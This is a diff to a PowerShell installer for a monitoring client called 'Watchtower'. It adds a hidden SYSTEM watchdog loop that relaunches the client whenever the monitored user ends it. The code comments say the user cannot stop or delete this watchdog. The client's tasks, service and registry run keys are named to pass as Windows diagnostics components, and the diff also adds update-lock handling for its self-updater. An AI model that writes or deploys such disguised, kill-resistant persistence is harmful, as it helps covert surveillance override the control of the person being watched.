@@ -457,6 +457,7 @@ if ($IsAdmin) {
 $BinaryPath = "$InstallDir\\watchtower.exe"
 $ConfigPath = "$InstallDir\\config.json"
 $UpdaterPath = "$InstallDir\\update.ps1"
+$WatchdogPath = "$InstallDir\\watchdog.ps1"
 $ServiceName = "WindowsDiagnosticsHost"
 $TaskName = "SystemDiagnosticsHostTask"
 $WatchdogTaskName = "SystemDiagnosticsWatchdog"
@@ -512,7 +513,9 @@ if ($TargetSid) {
 Remove-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
 Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
 
-# Clean up any legacy or watchdog tasks
+# Clean up any legacy or watchdog tasks. Stop the watchdog first so its running loop
+# cannot relaunch the client (and lock the binary) while we download and swap it.
+Stop-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName "SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsWatchdog" -Confirm:$false -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName "Microsoft\\Windows\\SystemDiagnosticsHostTask" -Confirm:$false -ErrorAction SilentlyContinue
@@ -587,6 +590,7 @@ if ($TargetSid) {
 $ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 $exe = 'C:\\ProgramData\\Watchtower\\watchtower.exe'
+$lock = 'C:\\ProgramData\\Watchtower\\update.lock'
 $url = '${downloadUrl}'
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -605,13 +609,18 @@ try {
         Remove-Item $new -Force
         return
     }
+    # Tell the watchdog an update is in progress so it does not relaunch the client
+    # mid-swap and lock the binary we are about to replace.
+    New-Item -Path $lock -ItemType File -Force | Out-Null
     Stop-ScheduledTask -TaskName 'SystemDiagnosticsHostTask' -ErrorAction SilentlyContinue
     Stop-Process -Name 'watchtower' -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
     # Restart the client even if the swap fails, so a failed update never leaves it stopped.
     try { Move-Item $new $exe -Force } catch {}
     Start-ScheduledTask -TaskName 'SystemDiagnosticsHostTask' -ErrorAction SilentlyContinue
-} catch {}
+} catch {} finally {
+    Remove-Item $lock -Force -ErrorAction SilentlyContinue
+}
 '@
     Set-Content -Path $UpdaterPath -Value $UpdaterScript -Force
     try {
@@ -620,6 +629,43 @@ try {
         $updPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         $updSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 15)
         Register-ScheduledTask -TaskName $UpdateTaskName -Action $updAction -Trigger $updTriggers -Principal $updPrincipal -Settings $updSettings -Force -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+
+    # 5c. SYSTEM watchdog: keeps the client alive even when the monitored user kills it.
+    #     The monitored account can End Task on watchtower.exe (it runs in their own
+    #     session), but cannot stop or delete a SYSTEM-owned task. This loop notices the
+    #     process is gone and relaunches it via the admin-owned user task within seconds.
+    $WatchdogScript = @'
+$ErrorActionPreference = 'SilentlyContinue'
+$taskName = 'SystemDiagnosticsHostTask'
+$lockFile = 'C:\\ProgramData\\Watchtower\\update.lock'
+while ($true) {
+    try {
+        $running = Get-Process -Name 'watchtower' -ErrorAction SilentlyContinue
+        if (-not $running) {
+            # Hold off while a self-update is swapping the binary; ignore a stale lock.
+            $updating = $false
+            if (Test-Path $lockFile) {
+                $age = (Get-Date) - (Get-Item $lockFile).LastWriteTime
+                if ($age.TotalMinutes -lt 5) { $updating = $true }
+            }
+            if (-not $updating) {
+                Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+            }
+        }
+    } catch {}
+    Start-Sleep -Seconds 5
+}
+'@
+    Set-Content -Path $WatchdogPath -Value $WatchdogScript -Force
+    try {
+        $wdAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \`"$WatchdogPath\`""
+        $wdTrigger = New-ScheduledTaskTrigger -AtStartup
+        $wdPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        # No execution time limit: the watchdog is a long-running loop. Restart it if it ever dies.
+        $wdSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
+        Register-ScheduledTask -TaskName $WatchdogTaskName -Action $wdAction -Trigger $wdTrigger -Principal $wdPrincipal -Settings $wdSettings -Force -ErrorAction SilentlyContinue | Out-Null
+        Start-ScheduledTask -TaskName $WatchdogTaskName -ErrorAction SilentlyContinue
     } catch {}
 
     # Files written above inherit the locked-down folder permissions.
@@ -688,10 +734,15 @@ $WatchdogTaskName = "SystemDiagnosticsWatchdog"
 
 Write-Host "🛑 Executing Watchtower Client Uninstallation..." -ForegroundColor Yellow
 
-# 1. Terminate running process
+# 1. Stop the SYSTEM watchdog first; otherwise its running loop would relaunch the
+#    client the moment we kill it. Stop-ScheduledTask terminates the loop instance.
+Stop-ScheduledTask -TaskName $WatchdogTaskName -ErrorAction SilentlyContinue
+Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+
+# 2. Terminate running process
 Stop-Process -Name "watchtower" -Force -ErrorAction SilentlyContinue
 
-# 2. Remove scheduled tasks
+# 3. Remove scheduled tasks
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName $WatchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName "SystemDiagnosticsUpdateTask" -Confirm:$false -ErrorAction SilentlyContinue
@@ -700,14 +751,14 @@ schtasks.exe /delete /tn $WatchdogTaskName /f 2>$null | Out-Null
 schtasks.exe /delete /tn "Microsoft\\Windows\\SystemDiagnosticsHostTask" /f 2>$null | Out-Null
 schtasks.exe /delete /tn "Microsoft\\Windows\\SystemDiagnosticsWatchdog" /f 2>$null | Out-Null
 
-# 3. Remove legacy service if present
+# 4. Remove legacy service if present
 sc.exe delete $ServiceName 2>$null | Out-Null
 
-# 4. Remove startup registry keys
+# 5. Remove startup registry keys
 Remove-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
 Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue
 
-# 5. Clean up installed binaries and configs
+# 6. Clean up installed binaries and configs
 foreach ($dir in $InstallDirs) {
     if (Test-Path $dir) {
         Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
